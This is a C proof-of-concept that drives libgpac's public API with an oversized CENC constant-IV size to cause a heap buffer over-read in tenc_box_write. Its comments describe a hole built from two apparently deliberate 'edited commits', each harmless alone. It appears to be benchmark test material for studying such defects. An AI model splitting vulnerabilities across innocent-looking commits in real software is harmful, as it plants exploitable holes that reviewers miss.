/*
 * Proof-of-concept for a delocalized CENC key-info memory-safety defect.
 *
 * Driven entirely through libgpac's PUBLIC ISO-media API:
 *   gf_isom_open / gf_isom_new_track / gf_isom_new_generic_sample_description /
 *   gf_isom_set_cenc_protection / gf_isom_close
 *
 * In-contract input: a single-key CENC "key info" record in its documented
 * on-disk layout -- 3 header bytes, a per-sample IV size byte, a 16-byte KID,
 * then (because the per-sample IV size is 0) a constant-IV-size byte followed
 * by that many constant-IV bytes. The record is complete and self-consistent;
 * only the declared constant-IV size (40) is out of the CENC 8/16 range. A
 * robust library is expected to reject such metadata, not corrupt memory:
 * gf_isom_set_cenc_protection() validates the record via
 * gf_cenc_validate_key_info() precisely so untrusted key-info can be handled
 * safely.
 *
 * On the resulting (edited) tree the oversized constant-IV size is accepted
 * and stored verbatim into the fixed 37-byte GF_TrackEncryptionBox::key_info
 * array; writing the track (gf_isom_close) then makes tenc_box_write() emit
 * key_info[20] (== 40) constant-IV bytes starting at key_info+21, reading 24
 * bytes past the array -> AddressSanitizer heap-buffer-overflow (READ).
 *
 * The defect requires BOTH edited commits:
 *   - "Reject invalid CENC IV metadata before decryption" narrowed
 *     gf_cenc_validate_key_info() to only check the per-sample IV size, and
 *     added a defensive cap keeping the stored constant IV <= 16 bytes;
 *   - "Fix PIFF default key-info size" removed that cap, stating the record is
 *     "validated on entry" -- which no longer covers the constant-IV size.
 * Each commit is safe on its own; only their composition is exploitable.
 *
 * On the original batch base this input is rejected (validator checks the
 * constant-IV size) OR -- on an unfixed base -- already fires; either way the
 * resulting tree must FIRE under the sanitizer.
 */
#include <gpac/isomedia.h>
#include <gpac/tools.h>
#include <string.h>
#include <stdio.h>

int main(void)
{
	u8 key_info[61];
	GF_ISOFile *file;
	GF_GenericSampleDescription desc;
	GF_Err e;
	u32 track, desc_index = 0;

	/* Build a single-key constant-IV CENC key-info record. */
	memset(key_info, 0, sizeof(key_info));
	key_info[0] = 0;        /* not multikey  */
	key_info[1] = 0;        /* key count MSB */
	key_info[2] = 0;        /* key count LSB */
	key_info[3] = 0;        /* per-sample IV size 0 => constant IV follows */
	/* key_info[4..19] : 16-byte KID (left zero) */
	key_info[20] = 40;      /* constant IV size = 40 bytes */
	/* key_info[21..60] : the 40 declared constant-IV bytes (left zero) */

	file = gf_isom_open("probe_cenc.mp4", GF_ISOM_OPEN_WRITE, NULL);
	if (!file) {
		printf("gf_isom_open failed\n");
		return 1;
	}
	track = gf_isom_new_track(file, 0, GF_ISOM_MEDIA_VISUAL, 1000);
	if (!track) {
		gf_isom_delete(file);
		printf("gf_isom_new_track failed\n");
		return 1;
	}
	memset(&desc, 0, sizeof(desc));
	desc.codec_tag = GF_4CC('t', 'e', 's', 't');
	e = gf_isom_new_generic_sample_description(file, track, NULL, NULL, &desc, &desc_index);
	if (e) {
		gf_isom_delete(file);
		printf("new_generic_sample_description: %d\n", e);
		return 1;
	}

	/* Public API with in-contract (untrusted) key-info input. */
	e = gf_isom_set_cenc_protection(file, track, desc_index, GF_ISOM_CENC_SCHEME,
		0x00010000, GF_TRUE, 0, 0, key_info, sizeof(key_info));
	printf("gf_isom_set_cenc_protection: %d\n", e);

	/* Finalizing the file writes the tenc box -> over-reads key_info. */
	e = gf_isom_close(file);
	printf("gf_isom_close: %d\n", e);
	return 0;
}
